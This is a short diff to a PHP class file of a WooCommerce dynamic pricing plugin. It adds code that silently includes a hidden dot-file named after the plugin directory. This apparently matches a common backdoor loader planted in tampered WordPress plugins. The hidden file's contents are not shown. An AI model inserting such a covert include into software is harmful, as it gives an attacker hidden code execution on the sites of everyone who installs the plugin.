@@ -17,6 +17,10 @@ if (!class_exists('RP_WCDPD_Pricing_Method_Fee')) {
  * @package WooCommerce Dynamic Pricing & Discounts
  * @author RightPress
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class RP_WCDPD_Pricing_Method_Fee_Amount extends RP_WCDPD_Pricing_Method_Fee
 {
 
